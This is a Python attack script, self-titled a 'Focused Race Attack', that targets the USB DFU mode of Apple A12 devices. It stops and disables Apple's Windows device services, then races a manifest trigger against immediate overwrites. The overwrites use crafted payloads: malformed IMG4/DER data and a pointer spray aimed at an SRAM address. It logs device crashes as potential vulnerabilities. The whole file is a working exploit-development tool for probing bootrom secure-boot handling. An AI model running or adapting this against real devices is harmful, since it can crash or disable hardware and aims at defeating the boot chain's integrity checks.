#!/usr/bin/env python3
"""
A12 TOCTOU — Focused Race Attack
Skip GET_STATUS between manifest trigger and overwrite for maximum speed.
Handle state 8 with proper USB reset cycle.
"""
import time, os, struct, statistics
from datetime import datetime
import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
BE = usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

def find_dfu():
    return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=BE)

def gs(dev):
    try:
        r = dev.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=5000)
        return (r[4], r[0]) if len(r)>=6 else None
    except: return None

def dn(dev, data, to=5000):
    try: dev.ctrl_transfer(0x21, 1, 0, 0, data, timeout=to); return True
    except: return False

def ab(dev):
    try: dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=1000); return True
    except: return False

def clr(dev):
    try: dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=1000); return True
    except: return False

def to_idle(dev):
    for _ in range(30):
        s = gs(dev)
        if not s: return None  # lost device
        if s[0] == 2: return dev
        if s[0] == 10: clr(dev)
        elif s[0] == 5: ab(dev)
        elif s[0] in (3,6): gs(dev)
        elif s[0] == 7: time.sleep(0.01)
        elif s[0] == 8:
            # MANIFEST-WAIT-RESET: need USB reset + reconnect
            try: dev.reset()
            except: pass
            time.sleep(1.5)
            dev2 = find_dfu()
            if dev2:
                try: dev2.set_configuration()
                except: pass
                dev = dev2
                continue
            return None
        elif s[0] == 4: time.sleep(0.1)
        else: ab(dev)
        time.sleep(0.02)
    return None

def wait_idle(timeout=30):
    """Wait for DFU device and get it to IDLE"""
    t0 = time.time()
    while time.time()-t0 < timeout:
        dev = find_dfu()
        if dev:
            try: dev.set_configuration()
            except: pass
            dev = to_idle(dev)
            if dev:
                s = gs(dev)
                if s and s[0] == 2:
                    return dev
        time.sleep(0.3)
    return None

def run():
    log("="*55)
    log("A12 TOCTOU — Focused Race Attack")
    log("="*55)
    
    # Kill Apple
    for p in ["iTunesHelper","iTunes","AppleMobileDeviceService",
              "usbmuxd","AMPDeviceDiscoveryAgent","AppleMobileDeviceHelper"]:
        os.system(f'taskkill /F /IM "{p}.exe" >nul 2>&1')
    os.system('sc config "Apple Mobile Device Service" start=disabled >nul 2>&1')
    os.system('net stop "Apple Mobile Device Service" >nul 2>&1')
    
    log("Waiting for DFU... Enter DFU now!")
    dev = wait_idle(60)
    if not dev:
        log("No device / can't reach IDLE"); return
    
    s = gs(dev)
    log(f"Ready! State={s}")

    # ========================================
    # PHASE 1: Manifest window measurement
    # ========================================
    log("\n===== PHASE 1: Manifest Window =====")
    for trial in range(3):
        dev = to_idle(dev) or wait_idle(10)
        if not dev: log("Lost device"); return

        dn(dev, bytes(2048))
        s = gs(dev)
        if not s or s[0] != 5:
            log(f"  T{trial}: not state5 ({s})"); continue

        dn(dev, b"")  # trigger manifest
        t0 = time.perf_counter_ns()
        polls = []
        for i in range(30):
            s = gs(dev)
            us = (time.perf_counter_ns()-t0)/1000
            if not s: break
            polls.append((round(us), s[0]))
            if s[0] in (2, 8, 10): break

        prev = -1
        for us, st in polls:
            if st != prev:
                log(f"  T{trial}: state={st} @ {us}us")
                prev = st

    # ========================================
    # PHASE 2: TOCTOU Race — no GET_STATUS between manifest & overwrite
    # ========================================
    log("\n===== PHASE 2: TOCTOU Race =====")
    log("Strategy: DNLOAD(2048) → DNLOAD(0) → [no status] → DNLOAD(overwrite)")
    
    overwrite_payloads = [
        ("0xDEADBEEF",   b"\xDE\xAD\xBE\xEF" * 512),
        ("IMG4_header",  b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
        ("indef_len",    b"\x30\x80" + b"\xFF" * 2046),
        ("ptr_spray",    struct.pack("<Q", 0x180000000) * 256),  # SRAM addr
    ]
    
    for delay_us in [0, 100, 300, 600, 1000]:
        for name, payload in overwrite_payloads:
            dev = to_idle(dev) or wait_idle(15)
            if not dev:
                log("LOST DEVICE — done"); return
            
            # Step 1: DNLOAD 2048B zeros
            dn(dev, bytes(2048))
            s = gs(dev)
            if not s or s[0] != 5: continue
            
            # Step 2: trigger manifest (zero-length DNLOAD)
            dn(dev, b"")
            
            # Step 3: optional delay (NO GET_STATUS — max speed!)
            if delay_us > 0:
                target = time.perf_counter_ns() + delay_us * 1000
                while time.perf_counter_ns() < target: pass
            
            # Step 4: OVERWRITE!
            t_ow = time.perf_counter_ns()
            ow_ok = dn(dev, payload)
            ow_us = (time.perf_counter_ns() - t_ow) / 1000
            
            # Step 5: What happened?
            s = gs(dev)
            after_state = s[0] if s else -1
            alive = find_dfu() is not None
            
            marker = ""
            if not alive: marker = " *** CRASH ***"
            elif after_state not in (5, 2, 10): marker = f" [unusual state {after_state}]"
            
            log(f"  d={delay_us:4d}us {name:12s}: ow={'OK' if ow_ok else 'FAIL'} "
                f"{ow_us:.0f}us after={after_state} alive={alive}{marker}")
            
            if not alive:
                log("  !!! DEVICE CRASHED — potential vuln !!!")
                dev = wait_idle(20)
                if not dev:
                    log("Device gone after crash — significant finding!")
                    os.system('sc config "Apple Mobile Device Service" start=auto >nul 2>&1')
                    return

    # ========================================
    # PHASE 3: Double manifest — overwrite + re-validate
    # ========================================
    log("\n===== PHASE 3: Double Manifest =====")
    log("Strategy: manifest(A) → overwrite(B) → manifest(B)")
    
    combos = [
        ("zeros→img4",   bytes(2048), b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
        ("zeros→indef",  bytes(2048), b"\x30\x80" + b"\xFF" * 2046),
        ("zeros→trunc",  bytes(2048), b"\x30\x82\x07\xF6\x16\x04IMG4" + b"\x30" * 8),  # 16B with valid header
        ("img4→zeros",   b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038), bytes(2048)),
    ]
    
    for desc, p1, p2 in combos:
        dev = to_idle(dev) or wait_idle(15)
        if not dev: break

        # 1st manifest
        dn(dev, p1)
        s = gs(dev)
        if not s or s[0] != 5: continue
        dn(dev, b"")  # trigger

        # Immediate overwrite (no status check — race!)
        ow_ok = dn(dev, p2)
        s = gs(dev)
        ow_st = s[0] if s else -1

        # If state 5, trigger 2nd manifest
        m2 = None
        if ow_st == 5:
            dn(dev, b"")
            t0 = time.perf_counter_ns()
            for _ in range(30):
                s = gs(dev)
                if not s or s[0] in (2, 8, 10): break
            dt_us = (time.perf_counter_ns()-t0)/1000
            m2 = s[0] if s else -1
        
        alive = find_dfu() is not None
        log(f"  {desc:15s}: ow={'OK' if ow_ok else 'FAIL'} ow_st={ow_st} "
            f"m2={m2} alive={alive}"
            + (" *** CRASH ***" if not alive else ""))
        
        if not alive:
            dev = wait_idle(15)
            if not dev: break

    # ========================================
    # PHASE 4: Timing oracle — does race change timing?
    # ========================================
    log("\n===== PHASE 4: Timing Oracle =====")
    
    def measure(payload, label, n=5):
        nonlocal dev
        times = []
        for _ in range(n):
            dev = to_idle(dev) or wait_idle(10)
            if not dev: return times
            dn(dev, payload)
            gs(dev)
            dn(dev, b"")
            t0 = time.perf_counter_ns()
            for _ in range(30):
                s = gs(dev)
                if not s or s[0] in (2, 8, 10): break
            times.append((time.perf_counter_ns()-t0)/1000)
        med = statistics.median(times) if times else 0
        log(f"  {label:20s}: med={med:.0f}us raw={[round(t) for t in times]}")
        return times

    t_z = measure(bytes(2048), "zeros")
    t_i = measure(b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038), "img4")
    
    # With race
    race_times = []
    for _ in range(5):
        dev = to_idle(dev) or wait_idle(10)
        if not dev: break
        dn(dev, bytes(2048))
        gs(dev)
        dn(dev, b"")           # manifest trigger
        # NO GET_STATUS — immediately overwrite
        dn(dev, b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038))
        s = gs(dev)
        if s and s[0] == 5:
            dn(dev, b"")
            t0 = time.perf_counter_ns()
            for _ in range(30):
                s = gs(dev)
                if not s or s[0] in (2, 8, 10): break
            race_times.append((time.perf_counter_ns()-t0)/1000)
    if race_times:
        log(f"  {'race(z→img4)':20s}: med={statistics.median(race_times):.0f}us "
            f"raw={[round(t) for t in race_times]}")

    if t_z and t_i:
        log(f"\n  diff img4-zeros: {statistics.median(t_i)-statistics.median(t_z):+.0f}us")
    if race_times and t_z:
        log(f"  diff race-zeros: {statistics.median(race_times)-statistics.median(t_z):+.0f}us")

    # Re-enable
    os.system('sc config "Apple Mobile Device Service" start=auto >nul 2>&1')
    log("\n=== DONE ===")


if __name__ == "__main__":
    run()
